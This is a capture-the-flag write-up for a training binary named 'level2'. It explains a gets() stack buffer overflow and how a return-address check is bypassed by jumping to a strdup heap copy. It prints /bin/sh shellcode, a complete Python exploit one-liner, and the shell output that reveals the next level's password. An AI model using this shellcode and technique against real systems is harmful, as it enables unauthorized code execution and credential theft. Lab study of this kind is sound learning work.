# BUFFER OVERFLOW MODIFYING THE RETURN ADDRESS TO A HEAP ADDRESS OPENING A CUSTOM SHELL

```asm
0804853f <main>:
 804853f:	55                   	push   ebp
 8048540:	89 e5                	mov    ebp,esp
 8048542:	83 e4 f0             	and    esp,0xfffffff0
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave  
 804854b:	c3                   	ret    
 804854c:	90                   	nop
 804854d:	90                   	nop
 804854e:	90                   	nop
 804854f:	90                   	nop
```
The main function is basically just calling the function `p`

```asm
080484d4 <p>:
 80484d4:	55                   	push   ebp
 80484d5:	89 e5                	mov    ebp,esp
 80484d7:	83 ec 68             	sub    esp,0x68
 80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484df:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
```
Its using gets again, on a stacked buffer of size 0x4c (76) bytes, so we can overflow it if we input more than 76 bytes.

Problems:
- {problem1} there is no other function that opens a shell
- {problem2}(see right below) there is a check on the return address of `p` that exit if it is on the stack addresses space (0xb0000000 and above)

```asm
 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    eax,0x8048620
 804850c:	8b 55 f4             	mov    edx,DWORD PTR [ebp-0xc]
 804850f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 8048513:	89 04 24             	mov    DWORD PTR [esp],eax
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
```

Our solutions:
- {problem1} we can put a custom shellcode in this buffer (`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`) as long as it is short enough to fit in the buffer (our is 21 bytes long, <64)
- {problem2} the return address doesnt detects heap addresses, and a strdup on this buffer is called after the check, so we can put the shellcode in the buffer, then fill with "A" until the return address, and then put the address of the buffer mallocated on the heap.


We need to check to things : the strdup returned address (ltrace technique) and the space between the buffer and the return address (gdb technique)

```
~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                   = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)        = 0xbffff6fc
puts("")                                             = 1
strdup("")                                           = 0x0804a008
+++ exited (status 8) +++
```
The strdup returned address is 0x0804a008

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level2/level2 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x08006161 in ?? ()
(gdb) quit
~$ echo -n "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | wc -c
82
```
The overflow exceeds by 2 characters on 82 characters writing, 80 characters to fill the buffer and the aligment

```
~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (80 - 21) + "\x08\xa0\x04\x08"' > /tmp/overflow
~$ cat /tmp/overflow - | ./level2
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
cat /home/user/level3/.pass            
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
